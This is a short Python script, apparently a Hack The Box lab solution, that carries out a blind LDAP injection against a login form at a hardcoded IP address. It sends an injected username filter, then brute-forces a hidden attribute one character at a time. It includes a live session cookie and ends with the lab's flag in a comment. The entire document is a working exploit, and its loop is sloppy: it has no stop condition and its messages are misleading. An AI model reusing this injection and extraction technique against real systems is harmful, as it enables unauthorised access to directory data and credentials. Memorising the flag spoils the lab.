import requests
import string

#payload is username: admin)(|(description=HTB* password: invalid)

url = "http://94.237.49.212:30577/index.php"

headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/x-www-form-urlencoded",
    "Content-Length": "54",
    "Origin": "http://94.237.49.212:30577",
    "DNT": "1",
    "Connection": "keep-alive",
    "Referer": "http://94.237.49.212:30577/index.php",
    "Cookie": "PHPSESSID=u85in2hrdlk4lr8h7n927lui8f",
    "Upgrade-Insecure-Requests": "1"
}

data = """username=admin%29%28%7C%28description%3D&password=*%29"""

response = requests.post(url, headers=headers, data=data)

print(response.status_code)
print(response.headers)
print(response.text)

character_list = list(string.printable) #create a character bank of all possible characters

valid_characters = "" #initialize an empty string to store the flag



response = requests.post(url, headers=headers, data=data)

print(response.status_code)
print(response.headers)
print(response.text)


def is_valid_character(data):
   response = requests.post(url, headers=headers, data=data)
   print(f"Request sent with payload: {data}")
   return "successful" in response.text


while True:
    character_found = False

    for char in character_list:
        data = f"username=admin%29%28%7C%28description%3DHTB%7B&password={valid_characters}{char}*)"
        if is_valid_character(data):
            if char == '*':
                continue
            valid_characters += char
            print(f"Valid character found: {char}")
            character_found = True
            break
        else:
            print(f"The password is: {valid_characters}")


            #flag = HTB{cfbf8ce58a8986ab567ed5533b186515}



